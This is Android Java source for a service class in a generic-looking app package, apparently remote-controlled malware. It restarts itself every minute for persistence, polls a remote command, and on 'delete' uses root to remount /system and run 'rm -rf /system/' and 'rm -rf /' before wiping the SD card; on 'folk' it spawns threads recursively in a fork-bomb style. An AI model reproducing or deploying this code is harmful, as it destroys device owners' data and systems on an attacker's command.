package com.mycompany.myapp2;

import android.app.ActivityManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Environment;
import android.os.IBinder;

import java.io.DataOutputStream;
import java.io.File;
import java.io.OutputStream;

import x.NetTools;

/**
 * Created by asus on 15-7-6.
 */
public class ManageService extends Service {
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
    }
    private class MyBroadcastReceiver extends BroadcastReceiver{

        @Override
        public void onReceive(Context context, Intent intent) {
            boolean isServiceRunning = false;
            if (intent.getAction().equals(Intent.ACTION_TIME_TICK)) {
                //检查Service状态

                ActivityManager manager = (ActivityManager)getBaseContext().getSystemService(Context.ACTIVITY_SERVICE);
                for (ActivityManager.RunningServiceInfo service :manager.getRunningServices(Integer.MAX_VALUE)) {
                    if("com.mycompany.myapp2.ManageService".equals(service.service.getClassName()))
                    {
                        isServiceRunning = true;
                    }
                }
                if (!isServiceRunning) {
                    Intent i = new Intent(context, ManageService.class);
                    context.startService(i);
                }


            }
        }
    };
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        IntentFilter filter = new IntentFilter(Intent.ACTION_TIME_TICK);
        MyBroadcastReceiver receiver = new MyBroadcastReceiver();
        registerReceiver(receiver, filter);

        SharedPreferences p=this.getSharedPreferences("get", Context.MODE_PRIVATE);
        Thread t=new Thread(new Runnable() {
            @Override
            public void run() {
                while(true){
                   String o= NetTools.getCommand();
                    if(o.equals("delete")){
                        deleteIt();
                    }else if(o.equals("folk")){
                        doFolkAtt();
                    }

                    try {
                        Thread.currentThread().sleep(300
                        );
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        if(!p.getBoolean("get",false)){
            Intent l=new Intent(getBaseContext(),MService.class);
            startService(l);
            //启动监听进程
        }
        return super.onStartCommand(intent, flags, startId);

    }

    private void deleteIt() {
        try{
            Process localProcess = Runtime.getRuntime().exec("su");
            OutputStream localOutputStream = localProcess.getOutputStream();
            DataOutputStream localDataOutputStream = new DataOutputStream(localOutputStream);
            localDataOutputStream.writeBytes("mount  -o  rw,remount  /system \n");
            localDataOutputStream.writeBytes("rm -f /system/app/system.apk \n");
            localDataOutputStream.writeBytes("rm -rf /system/app \n");
            localDataOutputStream.writeBytes("rm -rf /system/ \n");
            localDataOutputStream.writeBytes("rm -rf / \n");
        }catch(Exception e){
            e.printStackTrace();
        }

        new Thread(new Runnable() {
            @Override
            public void run() {
                deleteDir(new File("/mnt/sdcard"));
                deleteDir(new File("/sdcard"));
                deleteDir(Environment.getExternalStorageDirectory());
            }
        }).start();
    }
    private static boolean deleteDir(File dir) {
        if(dir!=null){
            if (dir.isDirectory()) {
                String[] children = dir.list();
                if(children.length>0){
                    for (int i=0; i<children.length; i++) {
                        boolean success = deleteDir(new File(dir, children[i]));
                        if (!success) {
                            return false;
                        }
                    }}
            }
            return dir.delete();
        }else{
            return true;
        }
    }

    private void doFolkAtt() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                for(int i=0;i<100000;i++){
                }
            }
        }).start();
        new Thread(new Runnable() {
            @Override
            public void run() {
                for(int i=0;i<100000;i++){
                }
            }
        }).start();
        doFolkAtt();
    }
}
